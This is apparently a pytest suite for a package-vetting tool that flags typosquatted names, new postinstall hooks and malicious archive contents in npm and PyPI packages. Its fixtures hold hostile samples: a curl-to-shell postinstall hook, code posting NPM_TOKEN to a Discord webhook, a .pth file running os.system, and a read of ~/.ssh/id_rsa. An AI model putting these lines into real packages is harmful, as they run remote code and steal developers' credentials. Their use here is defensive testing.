import io
import json
import tarfile
import zipfile
from datetime import datetime, timezone

import pytest

from safe_install import cli, registry
from safe_install.analyzers import Report, analyze_npm_metadata, analyze_pypi_metadata, scan_archive
from safe_install.typosquat import damerau_levenshtein, find_lookalikes

NOW = datetime(2026, 11, 13, tzinfo=timezone.utc)


def make_tgz(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(path)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_zip(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for path, content in files.items():
            zf.writestr(path, content)
    return buf.getvalue()


def npm_meta(scripts_by_version, created="2020-01-01T00:00:00Z"):
    versions, time = {}, {"created": created}
    for i, (v, scripts) in enumerate(scripts_by_version.items()):
        versions[v] = {
            "scripts": scripts,
            "repository": {"url": "git+https://github.com/x/y"},
            "maintainers": [{"name": "dev"}],
            "dist": {"tarball": f"https://registry.npmjs.org/pkg/-/pkg-{v}.tgz"},
        }
        time[v] = f"2021-0{i + 1}-01T00:00:00Z"
    return {"versions": versions, "time": time, "dist-tags": {"latest": list(versions)[-1]}}


# ── typosquatting ──

def test_distance():
    assert damerau_levenshtein("lodash", "lodahs") == 1  # transposition
    assert damerau_levenshtein("requests", "requests") == 0
    assert damerau_levenshtein("express", "expresss") == 1


@pytest.mark.parametrize("name,eco,expected", [
    ("lodahs", "npm", "lodash"),
    ("expresss", "npm", "express"),
    ("reqeusts", "pypi", "requests"),
    ("requests-secure", "pypi", "requests"),
    ("@evil/lodash", "npm", "lodash"),
    ("python_dateutil", "pypi", None),   # même nom normalisé : c'est le vrai
])
def test_lookalikes(name, eco, expected):
    hits = find_lookalikes(name, eco)
    if expected is None:
        assert hits == []
    else:
        assert expected in hits


def test_popular_package_is_not_flagged():
    assert find_lookalikes("lodash", "npm") == []
    assert find_lookalikes("Django", "pypi") == []


def test_unrelated_name_not_flagged():
    assert find_lookalikes("my-cool-internal-tool", "npm") == []


# ── npm ──

def test_clean_npm_package_is_ok():
    r = Report("npm", "pkg", "1.1.0")
    analyze_npm_metadata(npm_meta({"1.0.0": {"test": "jest"}, "1.1.0": {"test": "jest"}}), "1.1.0", r, NOW)
    assert r.verdict == "OK", r.as_dict()


def test_new_postinstall_is_flagged():
    meta = npm_meta({
        "1.0.0": {"test": "jest"},
        "1.0.1": {"postinstall": "curl http://1.2.3.4/x.sh | sh"},
    })
    r = Report("npm", "pkg", "1.0.1")
    analyze_npm_metadata(meta, "1.0.1", r, NOW)
    messages = " ".join(f.message for f in r.findings)
    assert "postinstall" in messages
    assert "ajouté dans cette version" in messages
    assert "curl | sh" in messages
    assert r.verdict == "BLOCK"


def test_brand_new_package():
    meta = npm_meta({"0.0.1": {}}, created="2026-11-10T00:00:00Z")
    r = Report("npm", "pkg", "0.0.1")
    analyze_npm_metadata(meta, "0.0.1", r, NOW)
    assert any("créé il y a 3 jour" in f.message for f in r.findings)


# ── archives ──

def test_malicious_tarball():
    blob = make_tgz({
        "package/package.json": "{}",
        "package/index.js": "const cp = require('child_process');\n"
                            "fetch('https://discord.com/api/webhooks/123/abc', {body: process.env.NPM_TOKEN})",
    })
    r = Report("npm", "pkg", "1.0.0")
    scan_archive(blob, "pkg-1.0.0.tgz", r)
    msgs = [f.message for f in r.findings]
    assert any("Discord" in m for m in msgs)
    assert any("child_process" in m for m in msgs)
    assert r.verdict == "BLOCK"


def test_clean_tarball():
    blob = make_tgz({"package/index.js": "module.exports = (a, b) => a + b;\n"})
    r = Report("npm", "pkg", "1.0.0")
    scan_archive(blob, "pkg-1.0.0.tgz", r)
    assert r.findings == []


def test_pth_and_setup_cmdclass_in_wheel_or_sdist():
    sdist = make_tgz({
        "evil-1.0/setup.py": "from setuptools.command.install import install\n"
                             "class Post(install):\n    def run(self): pass\n"
                             "setup(name='evil', cmdclass={'install': Post})",
    })
    r = Report("pypi", "evil", "1.0")
    scan_archive(sdist, "evil-1.0.tar.gz", r)
    assert any("setup.py" in f.message for f in r.findings)

    wheel = make_zip({"evil.pth": "import os; os.system('id')"})
    r2 = Report("pypi", "evil", "1.0")
    scan_archive(wheel, "evil-1.0-py3-none-any.whl", r2)
    assert any(".pth" in f.message for f in r2.findings)


def test_each_pattern_counted_once():
    blob = make_tgz({f"package/f{i}.js": "require('child_process')" for i in range(5)})
    r = Report("npm", "pkg", "1.0.0")
    scan_archive(blob, "x.tgz", r)
    assert len(r.findings) == 1


# ── PyPI ──

def test_pypi_sdist_only_and_new():
    meta = {
        "info": {"version": "0.1", "home_page": "", "project_urls": {}},
        "releases": {"0.1": [{"packagetype": "sdist", "upload_time_iso_8601": "2026-11-12T10:00:00Z"}]},
    }
    r = Report("pypi", "x", "0.1")
    analyze_pypi_metadata(meta, "0.1", r, NOW)
    msgs = " ".join(f.message for f in r.findings)
    assert "pas de wheel" in msgs and "créé il y a" in msgs and "dépôt" in msgs


# ── parsing & CLI (réseau simulé) ──

@pytest.mark.parametrize("spec,eco,expected", [
    ("lodash", "npm", ("lodash", None)),
    ("lodash@4.17.21", "npm", ("lodash", "4.17.21")),
    ("@types/node", "npm", ("@types/node", None)),
    ("@types/node@20.1.0", "npm", ("@types/node", "20.1.0")),
    ("requests==2.32.0", "pypi", ("requests", "2.32.0")),
])
def test_parse_spec(spec, eco, expected):
    assert registry.parse_spec(spec, eco) == expected


def test_cli_blocks_and_refuses_install(monkeypatch, capsys):
    meta = npm_meta({"1.0.0": {}, "1.0.1": {"postinstall": "node x.js"}})
    monkeypatch.setattr(registry, "npm_metadata", lambda name: meta)
    monkeypatch.setattr(registry, "npm_tarball", lambda m, v: (
        make_tgz({"package/x.js": "require('fs').readFileSync(home + '/.ssh/id_rsa')"}), "x.tgz"))
    called = []
    monkeypatch.setattr(cli, "run_install", lambda *a: called.append(a) or 0)

    code = cli.main(["npm", "lodahs", "--install", "--json"])
    out = json.loads(capsys.readouterr().out)
    assert code == 2
    assert out[0]["verdict"] == "BLOCK"
    assert called == []  # l'installation n'a pas été lancée


def test_cli_ok_installs(monkeypatch, capsys):
    meta = npm_meta({"1.0.0": {}, "2.0.0": {}})
    monkeypatch.setattr(registry, "npm_metadata", lambda name: meta)
    monkeypatch.setattr(registry, "npm_tarball", lambda m, v: (make_tgz({"package/i.js": "x=1"}), "i.tgz"))
    called = []
    monkeypatch.setattr(cli, "run_install", lambda eco, specs: called.append((eco, specs)) or 0)

    assert cli.main(["npm", "my-safe-lib", "--install"]) == 0
    assert called == [("npm", ["my-safe-lib"])]
